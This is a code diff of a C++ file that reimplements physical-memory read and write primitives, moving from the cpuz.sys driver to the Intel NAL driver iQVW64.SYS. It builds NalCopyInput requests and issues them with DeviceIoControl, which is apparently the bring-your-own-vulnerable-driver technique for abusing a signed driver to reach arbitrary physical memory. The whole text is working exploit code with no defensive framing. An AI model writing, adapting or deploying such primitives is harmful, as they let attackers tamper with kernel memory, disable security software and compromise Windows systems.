@@ -1,4 +1,4 @@
-// ioctl.cpp -- cpuz.sys physmem implementation.
+// ioctl.cpp -- iQVW64.SYS (Intel NAL) physmem implementation.
 
 #include "ioctl.h"
 
@@ -14,15 +14,16 @@ bool read_physical(HANDLE device, uint64_t phys, void* dst, size_t size) {
     while (size) {
         DWORD chunk = static_cast<DWORD>(std::min<size_t>(size, 0x1000));
 
-        CpuzReadWriteInput req{};
-        req.address = static_cast<DWORD_PTR>(phys);
-        req.length  = chunk;
-        req.buffer  = reinterpret_cast<DWORD_PTR>(out);
-        req.pad     = 0;
+        NalCopyInput req{};
+        req.case_number = NAL_CASE_COPY;
+        req.reserved = 0;
+        req.source = phys;
+        req.destination = reinterpret_cast<uint64_t>(out);
+        req.length = chunk;
 
         DWORD returned = 0;
-        if (!DeviceIoControl(device, IOCTL_CPUZ_READ,
-                             &req, sizeof(req), &req, sizeof(req),
+        if (!DeviceIoControl(device, IOCTL_NAL,
+                             &req, sizeof(req), nullptr, 0,
                              &returned, nullptr)) {
             std::printf("[!] ioctl::read_physical failed (phys=%016llX size=%u err=%lu)\n",
                         static_cast<unsigned long long>(phys), chunk, GetLastError());
@@ -41,15 +42,16 @@ bool write_physical(HANDLE device, uint64_t phys, const void* src, size_t size) 
     while (size) {
         DWORD chunk = static_cast<DWORD>(std::min<size_t>(size, 0x1000));
 
-        CpuzReadWriteInput req{};
-        req.address = static_cast<DWORD_PTR>(phys);
-        req.length  = chunk;
-        req.buffer  = reinterpret_cast<DWORD_PTR>(const_cast<uint8_t*>(in));
-        req.pad     = 0;
+        NalCopyInput req{};
+        req.case_number = NAL_CASE_COPY;
+        req.reserved = 0;
+        req.source = reinterpret_cast<uint64_t>(in);
+        req.destination = phys;
+        req.length = chunk;
 
         DWORD returned = 0;
-        if (!DeviceIoControl(device, IOCTL_CPUZ_WRITE,
-                             &req, sizeof(req), &req, sizeof(req),
+        if (!DeviceIoControl(device, IOCTL_NAL,
+                             &req, sizeof(req), nullptr, 0,
                              &returned, nullptr)) {
             std::printf("[!] ioctl::write_physical failed (phys=%016llX size=%u err=%lu)\n",
                         static_cast<unsigned long long>(phys), chunk, GetLastError());
